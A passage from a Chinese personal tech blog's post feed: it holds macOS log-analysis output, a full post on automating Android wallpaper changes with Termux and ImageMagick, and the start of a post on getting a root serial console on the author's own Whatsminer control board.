class="string">&quot;0000-0100&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;numberOfOccurrence&quot;</span><span class="punctuation">:</span><span class="number">1</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;deviceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;BBAOMACBOOKAIR2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processId&quot;</span><span class="punctuation">:</span><span class="number">960</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processName&quot;</span><span class="punctuation">:</span><span class="string">&quot;VTDecoderXPCService&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span><span class="string">&quot;DEPRECATED USE in libdispatch client: Changing target queue hierarchy after xpc connection was activated; set a breakpoint on _dispatch_bug_deprecated to debug&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;timeWindow&quot;</span><span class="punctuation">:</span><span class="string">&quot;0000-0100&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;numberOfOccurrence&quot;</span><span class="punctuation">:</span><span class="number">4</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;deviceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;BBAOMACBOOKAIR2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processId&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processName&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.apple.xpc.launchd&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span><span class="string">&quot;(com.apple.mdworker.bundles[12555]): Could not find uid associated with service: 0: Undefined error: 0 501&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;timeWindow&quot;</span><span class="punctuation">:</span><span class="string">&quot;0000-0100&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;numberOfOccurrence&quot;</span><span class="punctuation">:</span><span class="number">1</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;deviceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;BBAOMACBOOKAIR2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processId&quot;</span><span class="punctuation">:</span><span class="number">960</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processName&quot;</span><span class="punctuation">:</span><span class="string">&quot;VTDecoderXPCService&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span><span class="string">&quot;DEPRECATED USE in libdispatch client: Changing the target of a source after it has been activated; set a breakpoint on _dispatch_bug_deprecated to debug&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;timeWindow&quot;</span><span class="punctuation">:</span><span class="string">&quot;0000-0100&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;numberOfOccurrence&quot;</span><span class="punctuation">:</span><span class="number">4</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;deviceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;BBAOMACBOOKAIR2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processId&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processName&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.apple.xpc.launchd&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span><span class="string">&quot;(com.apple.mdworker.bundles[12536]): Service exited with abnormal code: 78&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;timeWindow&quot;</span><span class="punctuation">:</span><span class="string">&quot;0000-0100&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;numberOfOccurrence&quot;</span><span class="punctuation">:</span><span class="number">1</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;deviceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;BBAOMACBOOKAIR2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processId&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processName&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.apple.xpc.launchd&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span><span class="string">&quot;(com.apple.mdworker.bundles[12513]): Could not find uid associated with service: 0: Undefined error: 0 501&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;timeWindow&quot;</span><span class="punctuation">:</span><span class="string">&quot;0000-0100&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;numberOfOccurrence&quot;</span><span class="punctuation">:</span><span class="number">1</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;deviceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;BBAOMACBOOKAIR2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processId&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processName&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.apple.xpc.launchd&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span><span class="string">&quot;(com.apple.mdworker.bundles[12536]): Could not find uid associated with service: 0: Undefined error: 0 501&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;timeWindow&quot;</span><span class="punctuation">:</span><span class="string">&quot;0000-0100&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;numberOfOccurrence&quot;</span><span class="punctuation">:</span><span class="number">1</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;deviceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;BBAOMACBOOKAIR2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processId&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processName&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.apple.xpc.launchd&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span><span class="string">&quot;(com.apple.ScreenSaver.Computer-Name[12564]): Service exited due to SIGKILL | sent by Computer Name[12564]&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;timeWindow&quot;</span><span class="punctuation">:</span><span class="string">&quot;0000-0100&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;numberOfOccurrence&quot;</span><span class="punctuation">:</span><span class="number">1</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;deviceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;BBAOMACBOOKAIR2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processId&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processName&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.apple.xpc.launchd&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span><span class="string">&quot;(com.apple.mdworker.bundles[12555]): Service exited with abnormal code: 78&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;timeWindow&quot;</span><span class="punctuation">:</span><span class="string">&quot;0000-0100&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;numberOfOccurrence&quot;</span><span class="punctuation">:</span><span class="number">1</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;deviceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;BBAOMACBOOKAIR2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processId&quot;</span><span class="punctuation">:</span><span class="number">113</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processName&quot;</span><span class="punctuation">:</span><span class="string">&quot;syslogd&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span><span class="string">&quot;Configuration Notice: ASL Module \&quot;com.apple.callhistory.asl.conf\&quot; claims selected messages.&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;timeWindow&quot;</span><span class="punctuation">:</span><span class="string">&quot;0000-0100&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;numberOfOccurrence&quot;</span><span class="punctuation">:</span><span class="number">1</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;deviceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;BBAOMACBOOKAIR2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processId&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processName&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.apple.xpc.launchd&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span><span class="string">&quot;(com.apple.mdworker.bundles[12560]): Service exited with abnormal code: 78&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;timeWindow&quot;</span><span class="punctuation">:</span><span class="string">&quot;0000-0100&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;numberOfOccurrence&quot;</span><span class="punctuation">:</span><span class="number">1</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;deviceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;BBAOMACBOOKAIR2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processId&quot;</span><span class="punctuation">:</span><span class="number">113</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processName&quot;</span><span class="punctuation">:</span><span class="string">&quot;syslogd&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span><span class="string">&quot;ASL Sender Statistics&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;timeWindow&quot;</span><span class="punctuation">:</span><span class="string">&quot;0000-0100&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;numberOfOccurrence&quot;</span><span class="punctuation">:</span><span class="number">3</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;deviceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;BBAOMACBOOKAIR2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processId&quot;</span><span class="punctuation">:</span><span class="number">113</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processName&quot;</span><span class="punctuation">:</span><span class="string">&quot;syslogd&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span><span class="string">&quot;Configuration Notice: ASL Module \&quot;com.apple.cdscheduler\&quot; claims selected messages. Those messages may not appear in standard system log files or in the ASL database.&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;timeWindow&quot;</span><span class="punctuation">:</span><span class="string">&quot;0000-0100&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;numberOfOccurrence&quot;</span><span class="punctuation">:</span><span class="number">1</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;deviceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;BBAOMACBOOKAIR2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processId&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processName&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.apple.xpc.launchd&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span><span class="string">&quot;(com.apple.mdworker.bundles[12556]): Could not find uid associated with service: 0: Undefined error: 0 501&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;timeWindow&quot;</span><span class="punctuation">:</span><span class="string">&quot;0000-0100&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;numberOfOccurrence&quot;</span><span class="punctuation">:</span><span class="number">1</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;deviceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;BBAOMACBOOKAIR2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processId&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;processName&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.apple.xpc.launchd&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span><span class="string">&quot;(com.apple.mdworker.bundles[12556]): Service exited with abnormal code: 78&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;timeWindow&quot;</span><span class="punctuation">:</span><span class="string">&quot;0000-0100&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;numberOfOccurrence&quot;</span><span class="punctuation">:</span><span class="number">1</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>

<p>这里的大概解释下：</p>
<p>多行日志的合并问题，这里是用 sed 命令解决的，awk 程序主要是处理了“— last message peated 1 time —”的问题以及做日志分析（从日志里抓取关键信息并做统计且生成上报数据文件）。其实这样不是特完美，毕竟日志文件循环了两遍，理论上来讲最好过一遍就处理完毕的，但是我在 awk 里实在是没想好怎样同时处理多行日志合并以及“— last message peated 1 time —”的问题。这里请各位大佬教我。</p>
]]></content>
      <tags>
        <tag>sed</tag>
        <tag>awk</tag>
        <tag>gzcat</tag>
        <tag>head</tag>
        <tag>curl</tag>
        <tag>POST</tag>
        <tag>json</tag>
      </tags>
  </entry>
  <entry>
    <title>利用 Termux 和 Termux-API 在 Android 手机上定时自动更新壁纸</title>
    <url>/2022/10/%E5%88%A9%E7%94%A8%20termux%20%E5%92%8C%20termux-api%20%E5%9C%A8%20android%20%E6%89%8B%E6%9C%BA%E4%B8%8A%E5%AE%9A%E6%97%B6%E6%9B%B4%E6%96%B0%E5%A3%81%E7%BA%B8/index.html</url>
    <content><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>这个事情的需求，其实……就是闲得。</p>
<p>开个玩笑。我其实之前用 Tasker 这个 APP 做过类似的事情，见之前文章：<a href="/2018/07/%E5%88%86%E4%BA%AB%E4%B8%80%E4%BA%9B%E8%87%AA%E5%B7%B1DIY%E7%9A%84task%E7%9A%84profile/index.html">分享一些自己DIY的task的profile</a>，但是有一阵遇到了 android 手机的壁纸 bug，我的 pixel 给干挂了两回，其中有一回甚至给重制了才救回来，救回来之后就没起过自动更换壁纸的任务了。</p>
<p>这次是看到 V 站上有个大佬，展示自己极少的 APP 时，截图里展示了一个桌面，上面的壁纸上有格言，还有英文单词。于是我就自然而然的想要不要把毒鸡汤也写到壁纸上呢？：）</p>
<span id="more"></span>

<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h3 id="Termux-和-Termux-API"><a href="#Termux-和-Termux-API" class="headerlink" title="Termux 和 Termux-API"></a>Termux 和 Termux-API</h3><p>我这里环境（Termux 和 Termux-API）是现成的，但如果没有需要安装的话，请记住，不要装 google play 上的 Termux 和 Termux-API，而是要装 F-Droid 这个市场上的 Termux 和 Termux-API！</p>
<p>注意：要给 Termux 足够的权限（也许 Termux-API 也需要）：</p>
<ul>
<li>后台运行的权限（不要被节电模式给干掉）</li>
<li>要设置为随机启动</li>
</ul>
<p>最后，还要打开 Termux，输入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install termux-api;</span><br><span class="line"><span class="comment"># pkg install termux-api; # 也可以用命令 pkg</span></span><br></pre></td></tr></table></figure>

<h3 id="ImageMagick-及其他软件"><a href="#ImageMagick-及其他软件" class="headerlink" title="ImageMagick 及其他软件"></a>ImageMagick 及其他软件</h3><p>打开 Termux，继续输入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install ImageMagick;</span><br><span class="line">apt install wget curl grep sed;</span><br></pre></td></tr></table></figure>

<h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><h3 id="抓取毒鸡汤"><a href="#抓取毒鸡汤" class="headerlink" title="抓取毒鸡汤"></a>抓取毒鸡汤</h3><p><a href="https://djt.theyan.gs/">毒鸡汤</a> 也是我自己 fork 了某个大佬的代码，自己搭建的服务。本身没提供 API 服务，这里也没想再开发一个 API 接口，所以直接模拟 web 访问，然后把需要的数据抓出来即可。不过我们还需要手工折行。</p>
<h3 id="定时抓取壁纸并处理（用-ImageMagick）"><a href="#定时抓取壁纸并处理（用-ImageMagick）" class="headerlink" title="定时抓取壁纸并处理（用 ImageMagick）"></a>定时抓取壁纸并处理（用 ImageMagick）</h3><p>我自己有个壁纸服务：<a href="https://wallpaper.theyan.gs/wp">壁纸</a>，会定时更新输出的壁纸，后台爬虫是用 go 实现的。</p>
<p>这里我就直接用了自己的这个壁纸服务，定时（每小时）去抓一个壁纸回来。接着做如下处理：</p>
<ul>
<li>如果宽小于 1080 或者高小于 2400 的话，会首先被按原比例放大，直到宽达到 1080 或高达到 2400（具体看哪种放大的比率小）。</li>
<li>再接着在壁纸正中截取一个 1080x2400 的图片出来</li>
<li>最后在这个截取出来的 1080x2400 的图片的合适位置写上毒鸡汤服务中抓取出来的文本数据，把最终结果保存为文件</li>
</ul>
<h3 id="设置壁纸"><a href="#设置壁纸" class="headerlink" title="设置壁纸"></a>设置壁纸</h3><p>最后自然是把上一步保留的文件用 termux-wallpaper 命令（来自于软件包 Termux-API）设置成新壁纸。</p>
<h3 id="把整个工作自动化"><a href="#把整个工作自动化" class="headerlink" title="把整个工作自动化"></a>把整个工作自动化</h3><p>把上面的流程写成代码（假设存为文件 $HOME&#x2F;bin&#x2F;change_wallpaper.sh），再用 termux-job-scheduler（来自于软件包 Termux-API）将这个代码设置为定时运行。我的例子里我是这样用的。打开 Termux，输入命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">termux-job-scheduler \</span><br><span class="line">    --persisted <span class="literal">true</span> \</span><br><span class="line">    --period-ms 3600000 \</span><br><span class="line">    -s <span class="variable">$HOME</span>/bin/change_wallpaper.sh;</span><br><span class="line"><span class="comment"># persisted 是指重启后保持有效</span></span><br><span class="line"><span class="comment"># period-ms 3600000 是指一小时跑一次</span></span><br></pre></td></tr></table></figure>

<h2 id="几个坑"><a href="#几个坑" class="headerlink" title="几个坑"></a>几个坑</h2><h3 id="中文字体"><a href="#中文字体" class="headerlink" title="中文字体"></a>中文字体</h3><p>在图片上写中文（含全角标点）时需要用中文的字体，因为普通字体里没有中文字符呀！</p>
<p>所以，要在所有可用字体里选出有中文字符且全角标点位置不在中间的，其实还有个想法，就是想找一个酷一点的中文字体，我把所有可用字体做了个循环，测试写中文字符以及全角标点，结果保存到文件里，代码大概如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(\</span><br><span class="line">    magick -list font | \</span><br><span class="line">    grep <span class="string">&quot;Font:&quot;</span> | \</span><br><span class="line">    awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> \</span><br><span class="line">)</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line">    convert \</span><br><span class="line">        -font <span class="variable">$i</span> \</span><br><span class="line">        -pointsize 72 \</span><br><span class="line">        label:测，。试<span class="built_in">test</span> \</span><br><span class="line">        x.jpg x-<span class="variable">$&#123;i&#125;</span>.jpg</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>我先在我的 Mac 里跑的，找到一堆合适的字体以后，再去找 Termux 里 <code>magick -list font | grep &quot;Fonts:&quot; | awk &#39;&#123;print $2&#125;&#39;</code> 的结果来做对比，结果发现，匹配上的只有一种字体：<strong>Noto-Serif-CJK-SC</strong>。:(</p>
<p>当然，也可以再单独在 Termux 里安装新的好看的可用字体。但我没这么做，看以后需求吧。</p>
<h3 id="crond-vs-termux-job-scheduler"><a href="#crond-vs-termux-job-scheduler" class="headerlink" title="crond vs termux-job-scheduler"></a>crond vs termux-job-scheduler</h3><p>其实最早这个方案我是打算用 crond 来做定时任务的，软件都安装设置好了。</p>
<p>打开 Termux，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install cronie termux-services;</span><br></pre></td></tr></table></figure>

<p>关闭并重新打开 Termux</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sv-enable crond;</span><br></pre></td></tr></table></figure>

<p>但是发现用 crond 跑其他任务都没问题，但是跑 termux-API 里的命令总会报 Selinux 的错误！实在是搞不定啊，于是才转向 termux-job-scheduler 方案。</p>
<p>其实刚用 termux-job-scheduler 时日志里也出跟 crond 一样的信息，当时心就哇凉了，但没想到后来自己居然就好了？！：）</p>
<h3 id="ImageMagick-的-crop-跟-gravity-Center-一起用的问题"><a href="#ImageMagick-的-crop-跟-gravity-Center-一起用的问题" class="headerlink" title="ImageMagick 的 -crop 跟 -gravity Center 一起用的问题"></a>ImageMagick 的 -crop 跟 -gravity Center 一起用的问题</h3><p>ImageMagick 软件包里的命令：<strong>convert</strong> 有个参数：*-crop*，功能是用来从图片上截取一部分，这个参数还需要提供 x、y 两个参数，这两个可以理解为横坐标（x）和纵坐标（y），这个时候学过一点点编程基础的小可爱们是不是自然而然都会以为 <em>-crop</em> 参数（其实是操作参数，可以理解为命令）截取的长方形图片是以这个横坐标 x、纵坐标y 为顶点的呢？</p>
<p>我一开始也是这么认为的，所以当我用 <em>-gravity Center</em> 将坐标零点设置为图片中心之后，我将参数 x 和 y 分别设置成了 -540 和 -1200，结果就悲催了，最后经过调试，才知道当有 <em>-gravity Center</em> 时，x 和 y 是指截取长方形的中心的坐标！！！！</p>
<p>所以，这里的 x 和 y 都应该是 0 才对！！</p>
<h2 id="change-wallpaper-sh-代码"><a href="#change-wallpaper-sh-代码" class="headerlink" title="change_wallpaper.sh 代码"></a>change_wallpaper.sh 代码</h2><p>最后，show you the code:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/data/data/com.termux/files/usr/bin/bash</span></span><br><span class="line"></span><br><span class="line">TMP_IMG=<span class="string">&quot;<span class="subst">$(mktemp $HOME/tmp/tmpimg.XXXXXX)</span>&quot;</span></span><br><span class="line">sublen=8   <span class="comment"># 每行显示的字符个数</span></span><br><span class="line">DJT_TXT=<span class="string">&quot;<span class="subst">$(</span></span></span><br><span class="line"><span class="subst"><span class="string">        curl -s https://djt.theyan.gs | \</span></span></span><br><span class="line"><span class="subst"><span class="string">        grep -Po &#x27;(xxxxxxxxxx)</span>&#x27; | \</span></span><br><span class="line"><span class="string">        sed -r &#x27;s/.&#123;&#x27;&quot;</span><span class="variable">$sublen</span><span class="string">&quot;&#x27;&#125;/&amp;\n/g&#x27; \</span></span><br><span class="line"><span class="string">)&quot;</span></span><br><span class="line"></span><br><span class="line">wget -q -O - https://wallpaper.theyan.gs/wp | \</span><br><span class="line">    convert - \</span><br><span class="line">        -resize <span class="string">&#x27;1080x2400^&lt;&#x27;</span> \</span><br><span class="line">        - | \</span><br><span class="line">    convert - -gravity Center \</span><br><span class="line">        -crop 1080x2400+0+0 \</span><br><span class="line">        +repage \</span><br><span class="line">        - | \</span><br><span class="line">    magick - -font Noto-Serif-CJK-SC \</span><br><span class="line">        -pointsize 128 \</span><br><span class="line">        -fill DarkViolet \</span><br><span class="line">        -annotate +5+500 \</span><br><span class="line">        <span class="string">&quot;<span class="variable">$DJT_TXT</span>&quot;</span> \</span><br><span class="line">        <span class="variable">$TMP_IMG</span></span><br><span class="line"></span><br><span class="line">termux-wallpaper -f <span class="variable">$TMP_IMG</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> <span class="variable">$TMP_IMG</span></span><br><span class="line"><span class="comment"># 抓毒鸡汤那一段 grep 的正则需要自己调整这个程序才能正常跑</span></span><br><span class="line"><span class="comment"># 不要来抓我的毒鸡汤的数据呀：（，这个项目程序、数据都是开源的，可以直接下载的，地址毒鸡汤上有。</span></span><br></pre></td></tr></table></figure>

<p>最后，附壁纸截图一张：</p>
<p><img src="https://raw.githubusercontent.com/haw-haw/image-hosting/master/img/WechatIMG116.jpeg" alt="手机壁纸截图"></p>
]]></content>
      <tags>
        <tag>Android</tag>
        <tag>Termux</tag>
        <tag>Termux-API</tag>
        <tag>ImageMagick</tag>
        <tag>termux-job-scheduler</tag>
        <tag>termux-wallpaper</tag>
        <tag>F-Dorid</tag>
        <tag>convert</tag>
        <tag>magick</tag>
        <tag>cronie</tag>
        <tag>apt</tag>
        <tag>pkg</tag>
      </tags>
  </entry>
  <entry>
    <title>利用 ttl 连接获取神马（Whatsminer）矿机的 root 权限</title>
    <url>/2022/03/%E5%88%A9%E7%94%A8%20ttl%20%E8%BF%9E%E6%8E%A5%E8%8E%B7%E5%8F%96%E7%A5%9E%E9%A9%AC%E7%9F%BF%E6%9C%BA%E7%9A%84%20root%20%E6%9D%83%E9%99%90/index.html</url>
    <content><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>最近在美丽国矿场帮忙，顺便修下矿机。</p>
<p>本来心里有些想法，需要有设备（计算设备、网络设备）来实现，无奈手头没有资源。后来修神马矿机的时候发现其系统是基于 OpenWRT 的！于是就想如果能拿到 root 权限的话，是不是就能利用现有系统来做很多事情了？于是就开始研究怎么 root 其控制板（其实还有其他难点，比如控制板怎么取电？还要给控制板找一个盒子）。</p>
<h2 id="连接方法"><a href="#连接方法" class="headerlink" title="连接方法"></a>连接方法</h2><span id="more"></span>

<p>前同事、硬件玩儿家、大佬陈总给了我一个关键性信息：用 ttl 连接控制板可以直接获得 root 权限！</p>
<p>然后我就开始找设备，正好同事为了维修，早就采购的有 ch341a 编程器，于是我又让其帮忙采购了一包杜邦线就 OK 了。</p>
<p>这里其实没有什么太多的技巧，就是用杜邦线把 ch341a 的几个 pin 脚接到神马矿机控制板的几个 pin 脚上，再把 ch341a 的 usb 头插进电脑，最后再用模拟终端软件打开，如果没有问题，则会直接进 root 环境。</p>
<h3 id="请看截图"><a href="#请看截图" class="headerlink" title="请看截图"></a>请看截图</h3><p>连接方法也简单：</p>
<ul>
<li>就是 RX 和 TX 互相接；</li>
<li>gnd 接 gnd；</li>
</ul>
<ol>
<li>控制板</li>
</ol>
<p><img src="https://raw.githubusercontent.com/haw-haw/image-hosting/master/img/WechatIMG91.jpeg" alt="控制板上的连接方法"></p>
<p>注意：这里没有用杜邦线（因为当时杜邦线还没采购回来，所以用的是风扇的电源线），但这个图能清楚显示出接的是控制板上的哪几个 pin 脚</p>
<ol>
<li>ch341a 编程器(非杜邦线)</li>
</ol>
<p><img src="https://raw.githubusercontent.com/haw-haw/image-hosting/master/img/WechatIMG92.jpeg" alt="ch341a 编程器上的连接方法"></p>
<p>注意：这图里也没有用杜邦线</p>
<ol>
<li>ch341a 编程器插到电脑上</li>
</ol>
<p><img src="https://raw.githubusercontent.com/haw-haw/image-hosting/master/img/IMG_20220629_103740.jpg" alt="ch341a 编程器插到电脑上"></p>
<ol>
<li>矿机、ch341a 编程器和电脑</li>
</ol>
<p><img src="https://raw.githubusercontent.com/haw-haw/image-hosting/master/img/IMG_20220629_103716.jpg" alt="矿机、ch341a 编程器和电脑"></p>
<ol>
<li>获得 root 权限后的界面</li>
